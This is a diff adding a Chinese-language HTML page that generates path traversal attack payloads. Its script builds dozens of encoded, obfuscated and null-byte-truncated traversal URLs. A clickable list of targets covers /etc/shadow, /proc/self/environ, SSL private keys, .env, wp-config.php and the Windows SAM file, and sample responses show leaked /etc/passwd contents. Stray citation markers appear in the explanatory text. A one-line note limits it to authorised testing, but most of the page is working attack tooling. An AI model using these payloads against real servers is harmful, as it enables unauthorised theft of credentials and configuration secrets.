@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>高级路径遍历攻击测试Payload生成器</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background-color: #f5f7fa;
+            color: #333;
+            line-height: 1.6;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+        }
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid #eaeaea;
+        }
+        h1 {
+            color: #2c3e50;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            color: #7f8c8d;
+            font-size: 1.2em;
+        }
+        .content {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 30px;
+        }
+        .card {
+            flex: 1;
+            min-width: 300px;
+            background: white;
+            border-radius: 8px;
+            padding: 25px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.05);
+        }
+        h2 {
+            color: #3498db;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #3498db;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        input[type="text"], select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        .checkbox-group {
+            margin: 15px 0;
+        }
+        .checkbox-group label {
+            display: inline-block;
+            margin-right: 15px;
+            font-weight: normal;
+        }
+        .example {
+            margin: 20px 0;
+            padding: 15px;
+            background: #f8f9fa;
+            border-left: 4px solid #3498db;
+            border-radius: 4px;
+        }
+        .warning {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+        .info {
+            background: #d1ecf1;
+            border-left: 4px solid #0dcaf0;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+        ul {
+            padding-left: 20px;
+            margin: 15px 0;
+        }
+        li {
+            margin-bottom: 8px;
+        }
+        .code {
+            font-family: monospace;
+            background: #f8f9fa;
+            padding: 2px 5px;
+            border-radius: 3px;
+        }
+        .payload-list {
+            max-height: 400px;
+            overflow-y: auto;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        .payload-item {
+            padding: 10px;
+            border-bottom: 1px solid #eee;
+            font-family: monospace;
+            font-size: 14px;
+        }
+        .payload-item:last-child {
+            border-bottom: none;
+        }
+        .payload-category {
+            background-color: #e9ecef;
+            padding: 8px 12px;
+            margin-top: 15px;
+            margin-bottom: 8px;
+            border-radius: 4px;
+            font-weight: bold;
+        }
+        .button {
+            display: inline-block;
+            background: #3498db;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 5px;
+            text-decoration: none;
+            cursor: pointer;
+            border: none;
+            font-size: 16px;
+            margin-right: 10px;
+            margin-top: 10px;
+        }
+        .button:hover {
+            background: #2980b9;
+        }
+        .button.danger {
+            background: #e74c3c;
+        }
+        .button.danger:hover {
+            background: #c0392b;
+        }
+        .button.success {
+            background: #2ecc71;
+        }
+        .button.success:hover {
+            background: #27ae60;
+        }
+        .response {
+            background: #2c3e50;
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-family: monospace;
+            margin: 15px 0;
+        }
+        .tab {
+            overflow: hidden;
+            border: 1px solid #ccc;
+            background-color: #f1f1f1;
+            border-radius: 5px 5px 0 0;
+        }
+        .tab button {
+            background-color: inherit;
+            float: left;
+            border: none;
+            outline: none;
+            cursor: pointer;
+            padding: 10px 16px;
+            transition: 0.3s;
+        }
+        .tab button:hover {
+            background-color: #ddd;
+        }
+        .tab button.active {
+            background-color: #3498db;
+            color: white;
+        }
+        .tabcontent {
+            display: none;
+            padding: 15px;
+            border: 1px solid #ccc;
+            border-top: none;
+            border-radius: 0 0 5px 5px;
+        }
+        .system-files {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 15px;
+        }
+        .file-item {
+            padding: 10px;
+            background: #f8f9fa;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .file-item:hover {
+            background: #e2e6ea;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>高级路径遍历攻击测试Payload生成器</h1>
+            <p class="subtitle">生成和测试各种路径遍历Payload，检测目录遍历漏洞</p>
+        </header>
+
+        <div class="content">
+            <div class="card">
+                <h2>路径遍历Payload生成配置</h2>
+                
+                <div class="input-group">
+                    <label for="baseUrl">基础URL</label>
+                    <input type="text" id="baseUrl" placeholder="https://example.com/download?file=" value="https://example.com/download?file=">
+                </div>
+                
+                <div class="input-group">
+                    <label for="targetFile">目标文件</label>
+                    <input type="text" id="targetFile" placeholder="/etc/passwd" value="/etc/passwd">
+                </div>
+                
+                <div class="input-group">
+                    <label for="traversalDepth">遍历深度</label>
+                    <input type="number" id="traversalDepth" placeholder="10" value="10" min="1" max="50">
+                </div>
+                
+                <div class="checkbox-group">
+                    <label>Payload类型:</label>
+                    <label><input type="checkbox" name="payloadType" value="basic" checked> 基本遍历</label>
+                    <label><input type="checkbox" name="payloadType" value="encoding" checked> 编码绕过</label>
+                    <label><input type="checkbox" name="payloadType" value="obfuscation" checked> 混淆技术</label>
+                    <label><input type="checkbox" name="payloadType" value="truncation" checked> 截断技术</label>
+                    <label><input type="checkbox" name="payloadType" value="absolute" checked> 绝对路径</label>
+                </div>
+                
+                <div class="checkbox-group">
+                    <label>目标系统:</label>
+                    <label><input type="checkbox" name="targetOS" value="linux" checked> Linux/Unix</label>
+                    <label><input type="checkbox" name="targetOS" value="windows"> Windows</label>
+                    <label><input type="checkbox" name="targetOS" value="web"> Web应用</label>
+                </div>
+                
+                <button class="button success" onclick="generatePayloads()">生成Payload</button>
+                <button class="button" onclick="copyPayloads()">复制Payload</button>
+                <button class="button danger" onclick="clearPayloads()">清空</button>
+                
+                <div class="warning">
+                    <strong>注意:</strong> 仅用于授权的安全测试。遵守网络安全法。
+                </div>
+            </div>
+
+            <div class="card">
+                <h2>生成的Payload列表</h2>
+                <div id="payloadContainer" class="payload-list">
+                    <p class="info">Payload将显示在这里... 配置选项后点击"生成Payload"</p>
+                </div>
+                
+                <div class="info">
+                    <strong>提示:</strong> 使用这些Payload测试文件参数，观察服务器响应是否暴露敏感文件内容。
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>路径遍历攻击说明</h2>
+            
+            <div class="tab">
+                <button class="tablinks" onclick="openTab(event, 'Techniques')" id="defaultOpen">绕过技术</button>
+                <button class="tablinks" onclick="openTab(event, 'Targets')">测试目标</button>
+                <button class="tablinks" onclick="openTab(event, 'Examples')">示例响应</button>
+            </div>
+            
+            <div id="Techniques" class="tabcontent">
+                <h3>路径遍历绕过技术</h3>
+                
+                <div class="example">
+                    <h4>1. 基本遍历序列</h4>
+                    <p>使用 <code>../</code> 序列向上遍历目录结构。</p>
+                    <div class="code">../../../etc/passwd</div>
+                </div>
+                
+                <div class="example">
+                    <h4>2. 编码绕过</h4>
+                    <p>对特殊字符进行URL编码、双重编码或其他编码方式：</p>
+                    <ul>
+                        <li>URL编码: <code>..%2f..%2f..%2fetc%2fpasswd</code>:cite[1]:cite[7]</li>
+                        <li>双重URL编码: <code>..%252f..%252f..%252fetc%252fpasswd</code>:cite[1]:cite[7]:cite[10]</li>
+                        <li>Unicode编码: <code>..%c0%af..%c0%af..%c0%afetc%c0%afpasswd</code>:cite[1]</li>
+                    </ul>
+                </div>
+                
+                <div class="example">
+                    <h4>3. 混淆技术</h4>
+                    <ul>
+                        <li>双写绕过: <code>....//....//....//etc/passwd</code>:cite[1]:cite[7]:cite[10]</li>
+                        <li>多余斜杠: <code>../../../../etc////passwd</code></li>
+                        <li>当前目录引用: <code>./../../../../etc/passwd</code></li>
+                        <li>反斜杠(Windows): <code>..\..\..\windows\win.ini</code>:cite[1]:cite[7]</li>
+                    </ul>
+                </div>
+                
+                <div class="example">
+                    <h4>4. 截断技术</h4>
+                    <ul>
+                        <li>空字节截断: <code>../../../etc/passwd%00</code>:cite[1]:cite[7]:cite[10]</li>
+                        <li>空字节加扩展名: <code>../../../etc/passwd%00.jpg</code>:cite[1]:cite[7]:cite[10]</li>
+                        <li>超长文件名: 使用长字符串使WAF检测超限:cite[3]:cite[6]</li>
+                    </ul>
+                </div>
+                
+                <div class="example">
+                    <h4>5. 绝对路径绕过</h4>
+                    <p>直接使用绝对路径：<code>/etc/passwd</code>:cite[4]:cite[10]</p>
+                </div>
+                
+                <div class="example">
+                    <h4>6. 特殊技巧</h4>
+                    <ul>
+                        <li>UNC路径(Windows): <code>\\localhost\c$\windows\win.ini</code>:cite[7]</li>
+                        <li>Nginx off-by-slash: <code>https://example.com/files../</code>:cite[7]</li>
+                        <li>起始路径验证绕过: <code>/var/www/images/../../../etc/passwd</code>:cite[1]:cite[7]</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div id="Targets" class="tabcontent">
+                <h3>测试目标文件</h3>
+                <p>点击文件项自动添加到目标文件输入框：</p>
+                
+                <div class="system-files">
+                    <div class="file-item" onclick="setTargetFile('/etc/passwd')">
+                        <strong>/etc/passwd</strong> - 用户账户信息:cite[2]
+                    </div>
+                    <div class="file-item" onclick="setTargetFile('/etc/shadow')">
+                        <strong>/etc/shadow</strong> - 用户密码哈希:cite[2]
+                    </div>
+                    <div class="file-item" onclick="setTargetFile('/etc/hosts')">
+                        <strong>/etc/hosts</strong> - 主机名解析:cite[2]
+                    </div>
+                    <div class="file-item" onclick="setTargetFile('/proc/self/environ')">
+                        <strong>/proc/self/environ</strong> - 环境变量:cite[2]
+                    </div>
+                    <div class="file-item" onclick="setTargetFile('/proc/version')">
+                        <strong>/proc/version</strong> - 内核版本信息:cite[2]
+                    </div>
+                    <div class="file-item" onclick="setTargetFile('/home/user/.bash_history')">
+                        <strong>~/.bash_history</strong> - 命令历史:cite[2]
+                    </div>
+                    <div class="file-item" onclick="setTargetFile('/var/log/auth.log')">
+                        <strong>/var/log/auth.log</strong> - 认证日志:cite[2]
+                    </div>
+                    <div class="file-item" onclick="setTargetFile('/etc/group')">
+                        <strong>/etc/group</strong> - 用户组信息
+                    </div>
+                    <div class="file-item" onclick="setTargetFile('/etc/httpd/conf/httpd.conf')">
+                        <strong>Apache配置</strong> - HTTP服务器配置
+                    </div>
+                    <div class="file-item" onclick="setTargetFile('/etc/nginx/nginx.conf')">
+                        <strong>Nginx配置</strong> - HTTP服务器配置
+                    </div>
+                    <div class="file-item" onclick="setTargetFile('C:\\Windows\\System32\\drivers\\etc\\hosts')">
+                        <strong>Windows hosts文件</strong> - 主机文件:cite[2]
+                    </div>
+                    <div class="file-item" onclick="setTargetFile('C:\\Windows\\win.ini')">
+                        <strong>Windows win.ini</strong> - 系统配置:cite[1]:cite[2]
+                    </div>
+                    <div class="file-item" onclick="setTargetFile('.env')">
+                        <strong>.env文件</strong> - 环境配置文件
+                    </div>
+                    <div class="file-item" onclick="setTargetFile('wp-config.php')">
+                        <strong>wp-config.php</strong> - WordPress配置
+                    </div>
+                    <div class="file-item" onclick="setTargetFile('/etc/ssl/private/ssl-cert-snakeoil.key')">
+                        <strong>SSL私钥</strong> - 加密密钥
+                    </div>
+                </div>
+            </div>
+            
+            <div id="Examples" class="tabcontent">
+                <h3>示例服务器响应</h3>
+                
+                <div class="example">
+                    <h4>成功响应 (200 OK)</h4>
+                    <div class="response">
+HTTP/1.1 200 OK<br>
+Content-Type: text/plain<br>
+Content-Length: 1524<br><br>
+root:x:0:0:root:/root:/bin/bash<br>
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>
+bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>
+...
+                    </div>
+                </div>
+                
+                <div class="example">
+                    <h4>文件不存在 (404 Not Found)</h4>
+                    <div class="response">
+HTTP/1.1 404 Not Found<br>
+Content-Type: application/json<br><br>
+{"error": "File not found", "status": 404}
+                    </div>
+                </div>
+                
+                <div class="example">
+                    <h4>权限拒绝 (403 Forbidden)</h4>
+                    <div class="response">
+HTTP/1.1 403 Forbidden<br>
+Content-Type: text/html<br><br>
+&lt;html&gt;&lt;body&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;You don't have permission to access this resource.&lt;/body&gt;&lt;/html&gt;
+                    </div>
+                </div>
+                
+                <div class="example">
+                    <h4>路径遍历过滤 (500 Internal Error)</h4>
+                    <div class="response">
+HTTP/1.1 500 Internal Server Error<br>
+Content-Type: application/json<br><br>
+{"success":false,"message":"文件不存在","code":500,"result":null,"timestamp":1757923849318,"messageSn":null}
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // 默认打开第一个标签页
+        document.getElementById("defaultOpen").click();
+        
+        function openTab(evt, tabName) {
+            var i, tabcontent, tablinks;
+            tabcontent = document.getElementsByClassName("tabcontent");
+            for (i = 0; i < tabcontent.length; i++) {
+                tabcontent[i].style.display = "none";
+            }
+            tablinks = document.getElementsByClassName("tablinks");
+            for (i = 0; i < tablinks.length; i++) {
+                tablinks[i].className = tablinks[i].className.replace(" active", "");
+            }
+            document.getElementById(tabName).style.display = "block";
+            evt.currentTarget.className += " active";
+        }
+        
+        function setTargetFile(filename) {
+            document.getElementById('targetFile').value = filename;
+        }
+        
+        function generatePayloads() {
+            const baseUrl = document.getElementById('baseUrl').value;
+            const targetFile = document.getElementById('targetFile').value;
+            const depth = parseInt(document.getElementById('traversalDepth').value) || 10;
+            
+            // 获取选中的Payload类型
+            const selectedTypes = [];
+            document.querySelectorAll('input[name="payloadType"]:checked').forEach(cb => {
+                selectedTypes.push(cb.value);
+            });
+            
+            // 获取选中的目标系统
+            const selectedOS = [];
+            document.querySelectorAll('input[name="targetOS"]:checked').forEach(cb => {
+                selectedOS.push(cb.value);
+            });
+            
+            const payloads = [];
+            
+            // 基本遍历Payload
+            if (selectedTypes.includes('basic')) {
+                payloads.push({category: "基本遍历序列", payloads: [
+                    `${baseUrl}../../../../../../../../../../../../..${targetFile}`,
+                    `${baseUrl}....//....//....//....//....//....//${targetFile}`,
+                    `${baseUrl}..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..${targetFile.replace(/\//g, '\\\\')}`,
+                    `${baseUrl}../../../../../../../../../../../../..////////${targetFile}`,
+                    `${baseUrl}./../../../../../../../../../../../../..${targetFile}`
+                ]});
+                
+                // 添加基于深度的payload
+                for (let i = 5; i <= depth; i++) {
+                    const dots = '../'.repeat(i);
+                    payloads[0].payloads.push(`${baseUrl}${dots}${targetFile}`);
+                    payloads[0].payloads.push(`${baseUrl}${dots}..${targetFile}`);
+                }
+            }
+            
+            // 编码绕过Payload
+            if (selectedTypes.includes('encoding')) {
+                payloads.push({category: "编码绕过", payloads: [
+                    `${baseUrl}..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f${targetFile.replace(/\//g, '%2f')}`,
+                    `${baseUrl}..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f${targetFile.replace(/\//g, '%252f')}`,
+                    `${baseUrl}%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f${targetFile}`,
+                    `${baseUrl}..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af${targetFile.replace(/\//g, '%c0%af')}`,
+                    `${baseUrl}..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f${targetFile.replace(/\//g, '%ef%bc%8f')}`
+                ]});
+            }
+            
+            // 混淆技术Payload
+            if (selectedTypes.includes('obfuscation')) {
+                payloads.push({category: "混淆技术", payloads: [
+                    `${baseUrl}....//....//....//....//....//....//${targetFile}`,
+                    `${baseUrl}..//..//..//..//..//..//..//..//..//..//..//..//${targetFile}`,
+                    `${baseUrl}../.%2e/%2e%2e/.%2e/${targetFile}`,
+                    `${baseUrl}..;/..;/..;/..;/..;/${targetFile}`,
+                    `${baseUrl}..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..${targetFile.replace(/\//g, '\\\\')}`,
+                    `${baseUrl}..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c${targetFile.replace(/\//g, '%255c')}`
+                ]});
+            }
+            
+            // 截断技术Payload
+            if (selectedTypes.includes('truncation')) {
+                payloads.push({category: "截断技术", payloads: [
+                    `${baseUrl}../../../../../../../../../../../../..${targetFile}%00`,
+                    `${baseUrl}../../../../../../../../../../../../..${targetFile}%00.jpg`,
+                    `${baseUrl}../../../../../../../../../../../../..${targetFile}%00.png`,
+                    `${baseUrl}../../../../../../../../../../../../..${targetFile}%00.txt`,
+                    `${baseUrl}../../../../../../../../../../../../..${targetFile}?example=param`,
+                    `${baseUrl}../../../../../../../../../../../../..${targetFile}#fragment`,
+                    `${baseUrl}../../../../../../../../../../../../..${targetFile} `.repeat(5) + `${baseUrl}../../../../../../../../../../../../..${targetFile}`
+                ]});
+            }
+            
+            // 绝对路径Payload
+            if (selectedTypes.includes('absolute')) {
+                payloads.push({category: "绝对路径", payloads: [
+                    `${baseUrl}${targetFile}`,
+                    `${baseUrl}${targetFile}?bypass=test`,
+                    `${baseUrl}${targetFile}#fragment`,
+                    `${baseUrl}/var/www/images/../../../${targetFile.substring(1)}`,
+                    `${baseUrl}./${targetFile}`
+                ]});
+                
+                // Windows UNC路径
+                if (selectedOS.includes('windows')) {
+                    payloads[payloads.length-1].payloads.push(`${baseUrl}\\\\localhost\\c$\\${targetFile.replace(/\//g, '\\')}`);
+                }
+            }
+            
+            // 特殊系统特定Payload
+            if (selectedOS.includes('windows')) {
+                payloads.push({category: "Windows特定", payloads: [
+                    `${baseUrl}..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts`,
+                    `${baseUrl}..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini`,
+                    `${baseUrl}..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini`,
+                    `${baseUrl}..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini`,
+                    `${baseUrl}..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\repair\\sam`
+                ]});
+            }
+            
+            // Web应用特定Payload
+            if (selectedOS.includes('web')) {
+                payloads.push({category: "Web应用文件", payloads: [
+                    `${baseUrl}../../../../../../../../../../../../../app/config/parameters.yml`,
+                    `${baseUrl}../../../../../../../../../../../../../app/config/config.yml`,
+                    `${baseUrl}../../../../../../../../../../../../../var/www/.env`,
+                    `${baseUrl}../../../../../../../../../../../../../wp-config.php`,
+                    `${baseUrl}../../../../../../../../../../../../../config/database.php`,
+                    `${baseUrl}../../../../../../../../../../../../../application/config/database.php`,
+                    `${baseUrl}../../../../../../../../../../../../../web.config`,
+                    `${baseUrl}../../../../../../../../../../../../../robots.txt`,
+                    `${baseUrl}../../../../../../../../../../../../../package.json`
+                ]});
+            }
+            
+            const payloadContainer = document.getElementById('payloadContainer');
+            payloadContainer.innerHTML = '';
+            
+            payloads.forEach(category => {
+                const categoryElement = document.createElement('div');
+                categoryElement.className = 'payload-category';
+                categoryElement.textContent = category.category;
+                payloadContainer.appendChild(categoryElement);
+                
+                category.payloads.forEach(payload => {
+                    const payloadElement = document.createElement('div');
+                    payloadElement.className = 'payload-item';
+                    payloadElement.textContent = payload;
+                    payloadContainer.appendChild(payloadElement);
+                });
+            });
+        }
+        
+        function copyPayloads() {
+            const payloadContainer = document.getElementById('payloadContainer');
+            const payloads = Array.from(payloadContainer.querySelectorAll('.payload-item'))
+                .map(item => item.textContent)
+                .join('\n');
+            
+            navigator.clipboard.writeText(payloads)
+                .then(() => alert('Payload已复制到剪贴板!'))
+                .catch(err => console.error('无法复制文本: ', err));
+        }
+        
+        function clearPayloads() {
+            document.getElementById('payloadContainer').innerHTML = 
+                '<p class="info">Payload已清空... 配置选项后点击"生成Payload"</p>';
+        }
+        
+        // 初始生成
+        window.onload = generatePayloads;
+    </script>
+</body>
+</html>
